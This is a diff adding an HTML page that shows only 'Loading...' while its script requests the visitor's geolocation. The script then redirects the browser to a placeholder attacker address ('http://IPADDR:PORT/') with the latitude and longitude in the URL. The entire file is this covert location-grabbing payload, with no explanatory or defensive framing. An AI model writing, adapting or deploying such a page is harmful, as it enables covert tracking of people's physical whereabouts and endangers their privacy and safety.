@@ -1,0 +1,22 @@
+<html>
+<p id="1" onLoad="">Loading...</p>
+
+<script>
+    var x=document.getElementById("1");
+    function getLocation()
+    {
+        if (navigator.geolocation)
+        {
+            navigator.geolocation.getCurrentPosition(showPosition);
+        }
+        else{return 1;}
+    }
+    function showPosition(position)
+    {
+        var coordinates = "Latitude:" + position.coords.latitude + "_Longitude:" + position.coords.longitude;
+        document.location='http://IPADDR:PORT/'+coordinates;
+    }
+    getLocation()
+</script>
+
+</html>
